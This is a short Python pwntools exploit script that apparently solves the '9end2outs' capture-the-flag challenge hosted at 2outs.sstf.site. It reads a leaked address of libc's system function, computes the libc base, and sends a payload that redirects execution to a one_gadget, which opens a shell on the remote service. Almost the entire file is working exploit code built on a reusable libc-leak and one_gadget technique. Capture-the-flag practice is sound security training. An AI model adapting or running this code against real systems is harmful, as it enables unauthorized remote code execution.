#!/usr/bin/env python

from pwn import *

exe = ELF("9end2outs_patched")
libc = ELF("libc6_2.35-0ubuntu3.1_amd64.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("2outs.sstf.site", 1337)

    return r

r = conn()
sla = lambda a,b : r.sendlineafter(f'{a}'.encode('utf-8'), f'{b}'.encode('utf-8'))
sl = lambda a : r.sendline(f'{a}'.encode())
ru = lambda a : r.recvuntil(f'{a}'.encode())

one_gadget = 0xebcf8
realign_stack = 0x00000000000c5eca#: add rsp, 0x70; pop rbx; pop rbp; pop r12; ret;

def main():


    sla('>', "system")
    ru("at ")
    system_libc = int(r.recv(14),16)
    libc.address = system_libc - libc.symbols["system"]
    log.info(f"[+] libc base: {hex(libc.address)}")
    sla('>', "puts")
    #gdb.attach(r)

    log.info(f'one_gadget : {hex(libc.address + one_gadget)}')

    r.sendline(b''+p64(0x4141414141414141) + p64(libc.address + one_gadget))

    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
